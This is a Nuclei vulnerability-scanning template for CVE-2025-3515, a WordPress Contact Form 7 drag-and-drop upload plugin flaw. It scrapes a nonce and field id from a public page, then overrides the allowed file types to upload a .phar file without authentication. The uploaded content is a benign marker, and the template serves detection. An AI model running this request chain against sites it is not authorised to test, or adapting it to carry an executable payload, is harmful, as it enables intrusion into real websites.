id: CVE-2025-3515

info:
  name: WordPress CF7 Drag & Drop Upload <= 1.3.8.9 â€“ Unauth .phar Upload (PoC)
  author: gsharma101
  severity: high
  description: >
    Extracts ajax_nonce and field id from a public page, then attempts an unauthenticated
    .phar upload via admin-ajax.php?action=dnd_codedropz_upload. Intrusive PoC only; payload is non-executable.
  classification:
    cve-id: CVE-2025-3515
    cwe-id: CWE-434
  reference:
    - https://github.com/projectdiscovery/nuclei-templates/issues/13029
    - https://wpscan.com/plugin/drag-and-drop-multiple-file-upload-contact-form-7/
  tags: wordpress,wp-plugin,wordpress-plugin,contactform7,drag-and-drop-multiple-file-upload-contact-form-7,fileupload,phar,cve,cve2025,intrusive

variables:
  page_path: "/?page_id=9"

http:
  - raw:
      # 1) Load public page to capture ajax_nonce + field id
      - |
        GET {{page_path}} HTTP/1.1
        Host: {{Hostname}}

      # 2) Try uploading a .phar using that nonce
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150
        Referer: {{BaseURL}}{{page_path}}
        X-Requested-With: XMLHttpRequest
        Accept-Encoding: gzip

        -----------------------------735323031399963166993862150
        Content-Disposition: form-data; name="supported_type"

        jpeg|png|jpg|gif|txt|phar
        -----------------------------735323031399963166993862150
        Content-Disposition: form-data; name="size_limit"

        5242880
        -----------------------------735323031399963166993862150
        Content-Disposition: form-data; name="action"

        dnd_codedropz_upload
        -----------------------------735323031399963166993862150
        Content-Disposition: form-data; name="type"

        click
        -----------------------------735323031399963166993862150
        Content-Disposition: form-data; name="security"

        {{ajax_nonce}}
        -----------------------------735323031399963166993862150
        Content-Disposition: form-data; name="nonce"

        {{ajax_nonce}}
        -----------------------------735323031399963166993862150
        Content-Disposition: form-data; name="id"

        {{field_id}}
        -----------------------------735323031399963166993862150
        Content-Disposition: form-data; name="upload-file"; filename="{{randstr}}.phar"
        Content-Type: application/octet-stream

        HELLO-NUCLEI-TEST-{{randstr}}
        -----------------------------735323031399963166993862150--

    extractors:
      # ajax_nonce from inline JS config
      - type: regex
        name: ajax_nonce
        internal: true
        part: body_1
        group: 1
        regex:
          - "\"ajax_nonce\"\\s*:\\s*\"([A-Za-z0-9_-]+)\""

      # form field id
      - type: regex
        name: field_id
        internal: true
        part: body_1
        group: 1
        regex:
          - "data-id=[\\\"'](\\d+)[\\\"']"

      # file path in JSON (strict: must include our randstr)
      - type: regex
        name: file_path
        internal: true
        part: body_2
        group: 1
        regex:
          - "(/wp-content/uploads/[^\\\"\\s]*{{randstr}}\\.phar)"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      # Require success flag
      - type: word
        part: body_2
        words:
          - "\"success\":true"
      # And require our exact uploaded filename to appear in the JSON/path
      - type: regex
        part: body_2
        regex:
          - "/wp-content/uploads/[^\"\\s]*{{randstr}}\\.phar"
